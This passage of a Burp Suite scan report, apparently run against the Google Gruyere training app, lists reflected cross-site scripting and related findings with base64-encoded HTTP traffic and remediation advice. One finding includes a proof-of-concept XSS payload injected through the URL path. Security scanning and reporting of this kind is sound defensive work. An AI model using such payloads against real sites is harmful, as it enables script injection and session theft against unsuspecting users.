LmdldEVsZW1lbnRCeUlkKCd1c2VyX25hbWUnKTsKICBpZiAobiAmJiBlbGVtZW50KSB7CiAgICBlbGVtZW50LmlubmVySFRNTCA9IHJlc3BvbnNlWzBdOwogIH0KCiAgLy8gVGhlIHNuaXBwZXQgZGl2cyBhcmUgbnVtYmVyZWQgMCwgMSwgLi4uCiAgZm9yICh2YXIgaSA9IDE7IGkgPCBuOyArK2kpIHsKICAgIHZhciBlbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaSAtIDEpOwogICAgaWYgKGVsZW1lbnQpIHsKICAgICAgZWxlbWVudC5pbm5lckhUTUwgPSByZXNwb25zZVtpXTsKICAgIH0KICB9Cn07CgpmdW5jdGlvbiBfcmVmcmVzaFNuaXBwZXRzKHVuaXF1ZUlkLCB1aWQpIHsKICBfcmVmcmVzaCgiLyIgKyB1bmlxdWVJZCArICIvZmVlZC5ndGw/dWlkPSIgKyB1aWQsIF9maW5pc2hSZWZyZXNoU25pcHBldHMpOwp9Owo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5468490908424206336</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/lib.js]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/lib.js [URL path filename]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the HTML document as plain text between tags. The payload <b>etdcl&lt;script&gt;alert(1)&lt;/script&gt;jw2fj</b> was submitted in the URL path filename. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbGliLmpzZXRkY2wlM2NzY3JpcHQlM2VhbGVydCgxKSUzYy9zY3JpcHQlM2VqdzJmaiBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZWQ5YzNiMzlkMWE0ZjMzMWE4YjQ2Yzg1YjAyMTZDYNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDozNCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY2Ng0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL2xpYi5qc2V0ZGNsPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pmp3MmZqPC9kaXY+CgoKPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7325337607062732800</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/lib.js]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/lib.js [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbGliLmpzbzhkYWN1NmY0NiBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYjI4ZjU1MjE0YTI5OWZjM2Q0NDdmYWVjYzg1ZDg3MDMNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDoxOCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY1MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPlVucmVjb2duaXplZCBmaWxlIHR5cGUgKC9saWIuanNvOGRhY3U2ZjQ2KS48L2Rpdj4KCgo8L2JvZHk+Cgo8L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5047902984280162304</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/login]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/login]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4gSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYzQ5MjUzYmU0YjJkNTc5OGM4NzhhZGY4ZTUwOWQwNjINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozOTo1OCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjk5MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IExvZ2luPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZn